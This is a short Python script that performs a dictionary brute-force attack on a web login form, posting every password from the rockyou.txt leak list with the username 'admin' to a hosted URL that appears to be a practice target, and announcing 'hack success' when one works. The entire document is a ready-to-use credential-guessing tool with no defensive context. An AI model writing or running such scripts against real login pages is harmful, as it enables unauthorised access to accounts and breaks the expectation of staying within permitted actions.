import time,requests

start = time.time()
URL = "https://loginbruteforce.onrender.com/"

with open("rockyou.txt", "rb") as file:
    file_cont = file.readlines()

for password in file_cont:
    web = requests.post(URL, data={f"username":"admin", "password":{password.strip().decode()}}).text
    if "for educational purpose" not in web :
        print("hack success")
        print(password)
        print(f"Time = {(time.time()-start)/60}min")
        break


